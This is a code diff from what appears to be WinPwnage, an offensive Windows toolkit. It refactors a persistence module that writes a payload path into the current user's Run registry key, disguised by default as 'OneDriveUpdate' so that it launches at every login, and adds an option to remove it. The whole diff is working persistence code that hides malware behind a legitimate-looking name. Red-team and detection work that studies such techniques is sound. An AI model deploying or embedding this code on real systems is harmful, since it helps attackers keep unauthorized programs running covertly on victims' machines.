@@ -1,5 +1,3 @@
-import os
-import _winreg
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
@@ -15,25 +13,21 @@ hkcurun_info = {
 }
 
 
-def reg_create(path, payload):
-	try:
-		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, os.path.join(path), 0, _winreg.KEY_ALL_ACCESS)
-		_winreg.SetValueEx(key, "OneDriveUpdate", 0, _winreg.REG_SZ, payload)
-		_winreg.CloseKey(key)
-	except Exception as error:
-		return False
-	else:
-		return True
-
-
-def hkcu_run(payload):
-	if payloads().exe(payload):
-		if reg_create("Software\\Microsoft\\Windows\\CurrentVersion\\Run", payload):
-			print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
-			print_success("Successfully installed persistence, payload will run at login")
+def hkcu_run(payload, name='OneDriveUpdate', add=True):
+	if add:
+		if payloads().exe(payload):
+			if registry().modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name, value=payload):
+				print_success("Successfully created {name} key containing payload ({payload})".format(name=name, payload=payload))
+				print_success("Successfully installed persistence, payload will run at login")
+			else:
+				print_error("Unable to install persistence")
+				return False
 		else:
-			print_error("Unable to install persistence")
+			print_error("Cannot proceed, invalid payload")
 			return False
 	else:
-		print_error("Cannot proceed, invalid payload")
-		return False
+		if registry().remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name):
+			print_success("Successfully removed persistence")
+		else:
+			print_error("Unable to remove persistence")
+			return False
